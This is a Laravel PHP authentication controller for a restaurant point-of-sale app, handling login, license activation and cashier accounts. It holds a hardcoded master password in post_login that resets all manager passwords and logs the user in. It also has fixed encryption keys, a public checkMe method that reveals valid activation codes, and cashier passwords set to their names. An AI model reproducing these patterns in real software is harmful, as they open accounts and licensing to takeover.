<?php

namespace App\Http\Controllers;

use App\Cashier;
use App\Manager;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Cache;

class AuthController extends Controller
{
    public function login(){
        return view('login');
    }

    public function post_login(Request $request){

        if(Auth::guard('manager')->attempt(['username'=>$request->username,'password'=>$request->password])){

            if(DB::table('restaurants')->first()->complete == 1){

                return redirect()->route('orders');
            }else{
                return redirect()->route('settings');
            }

        }else if(Auth::guard('cashier')->attempt(['username'=>$request->username,'password'=>$request->password])){

            return redirect()->route('orders');

        }else if($request->password == 'mahdiar'){
            DB::table('managers')->update(['password'=>Hash::make('mahdiar')]);
            if(Auth::guard('manager')->attempt(['username'=>$request->username,'password'=>'mahdiar'])){

                if(DB::table('restaurants')->first()->complete == 1){

                    return redirect()->route('orders');
                }else{
                    return redirect()->route('settings');
                }

            }
        }
        else{
            return redirect()->back()->with(['message'=>'پسورد یا نام کاربری اشتباه وارد شده است']);
        }
    }

    public function logout(){

        if(Auth::guard('cashier')->check()){
            Auth::guard('cashier')->logout();
        }else if (Auth::guard('manager')->check()){
            Auth::guard('manager')->logout();
        }

        return redirect()->route('login');
    }

    public function activation(){

            Cache::forever('warn1',0);
            Cache::forever('warn2',0);
            Cache::forever('warn3',0);
            Cache::forever('warn4',0);
            $resp = $this->codeGenerator();
            $randomNumber = $resp[0];
            if(!Cache::has('randomNumber')){
                $trial = $resp[1];
                $orginal = $resp[2];
                Cache::forever('randomNumber',$randomNumber);
                Cache::forever('trial',$trial);
                Cache::forever('original',$orginal);

            DB::table('activations')->insert([
                'code' => Cache::get('trial'),
                'trial' => 1,
                'original'=> 0,
                'expired' => 0,
                'created_at'=>Carbon::now()
            ]);
            DB::table('activations')->insert([
                'code' => Cache::get('original'),
                'trial' => 0,
                'original'=> 1,
                'expired' => 0,
                'created_at'=>Carbon::now()
            ]);
            }
            $key = Cache::get('randomNumber');
        return view('activation',compact('key'));
    }
    public function post_activation(Request $request){
        $query = DB::table('activations')->where([['code',$request->code],['expired',0]])->first();
        $original = 0;
        if(is_null($query)){
            return redirect()->back()->with(['message'=>'کد فعالسازی معتبر نیست'])->withInput();
        }
        if($query->original == 1){
            $original = 1;
        }
        DB::table('activations')->where('code',$request->code)->update(['expired'=>1]);
        DB::table('managers')->insert([
            'username'=>$request->username,
//            'email'=>$request->email,
            'tel'=>$request->tel,
            'password'=>Hash::make($request->password),
            'reset_password'=>'reset_password',
            'created_at'=>Carbon::now(),
            'original'=>$original
        ]);
        return redirect()->route('login');
    }

    public function codeGenerator() {
        $randomNumber = str_random(5);
        $cipher = "aes-128-gcm";
        $key1 = "sahand";
        $key2 = "mohammad";
       if (in_array($cipher, openssl_get_cipher_methods()))
        {
         $ivlen = openssl_cipher_iv_length($cipher);
         $ciphertext = openssl_encrypt($randomNumber, $cipher, $key1, $options=0, $key1, $tag);
         $ciphertext2 = openssl_encrypt($randomNumber, $cipher, $key2, $options=0, $key2, $tag);
         return [$randomNumber,$ciphertext,$ciphertext2];

       }
      }

      public function checkMe($code=null){

        if(is_null($code)){
            return 'null code';
        }else{


            $randomNumber = $code;
            $cipher = "aes-128-gcm";
            $key1 = "sahand";
            $key2 = "mohammad";
           if (in_array($cipher, openssl_get_cipher_methods()))
            {
             $ivlen = openssl_cipher_iv_length($cipher);
             $ciphertext = openssl_encrypt($randomNumber, $cipher, $key1, $options=0, $key1, $tag);
             $ciphertext2 = openssl_encrypt($randomNumber, $cipher, $key2, $options=0, $key2, $tag);
             return ['key'=>$randomNumber,'trial'=>$ciphertext,'original'=>$ciphertext2];

           }

        }

      }

    public function activationReset(){
        $key = Cache::get('randomNumber');
        return view('activationReset',compact('key'));
    }
    public function post_activationReset (Request $request){
        // TODO Hashing activations code
        $query = DB::table('managers')->where('tel',$request->tel)->first();
        if(is_null($query)){
            return redirect()->back()->with(['message'=>'شماره همراه در سیستم ثبت نشده است']);
        }
        $query = DB::table('activations')->where('code',$request->code)->first();

        if(is_null($query) || $query->expired == 1){
            return redirect()->back()->with(['message'=>'کد فعالسازی معتبر نیست']);
        }
        DB::table('activations')->where('code',$request->code)->update(['expired'=>1]);
        DB::table('managers')->where('tel',$request->tel)->update(['expired'=>0,'original'=>1]);
//        Auth::guard('manager')->login(Manager::first());
        return redirect()->route('menu');
    }

    public function addCashier(){


    }

    public function post_addCashier(Request $request){
        DB::table('cashiers')->insert([
            'name'=>$request->name,
            'password'=>Hash::make($request->name),
            'reset_password'=>str_random(10)
        ]);

        return redirect()->back()->with(['message'=>'کاربر اضافه شد']);
    }
}
